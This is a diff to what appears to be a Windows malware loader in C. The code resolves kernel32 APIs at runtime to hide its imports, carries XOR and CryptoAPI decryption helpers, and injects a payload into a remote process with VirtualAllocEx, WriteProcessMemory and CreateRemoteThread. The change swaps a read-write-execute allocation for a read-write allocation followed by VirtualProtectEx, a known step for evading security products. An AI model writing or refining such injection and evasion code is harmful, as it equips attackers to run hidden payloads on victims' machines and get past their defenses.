@@ -23,6 +23,7 @@ typedef LPVOID (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess,BOOL bInheritHandl
 typedef VOID (WINAPI * CloseHandle_t)(HANDLE hObject);
 typedef LPVOID (WINAPI * VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+typedef BOOL (WINAPI * VirtualProtectEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 typedef HANDLE (WINAPI * CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 typedef BOOL (WINAPI * WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
 typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
@@ -37,6 +38,7 @@ typedef BOOL (WINAPI * CryptDecrypt_t)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Fi
 typedef BOOL (WINAPI * CryptReleaseContext_t)(HCRYPTPROV hProv, DWORD dwFlags);
 typedef BOOL (WINAPI * CryptDestroyHash_t)(HCRYPTHASH hHash);
 typedef BOOL (WINAPI * CryptDestroyKey_t)(HCRYPTKEY hKey);
+
 
 void XOR(char *data, size_t data_len, char *key, size_t key_len) {
 	int j;
@@ -151,11 +153,13 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     // Resolved functions
     VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
     WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
+    VirtualProtectEx_t pVirtualProtectEx = (VirtualProtectEx_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualProtectEx");
     CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
     WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
 
-    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
+    pVirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect);
     
     hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
 
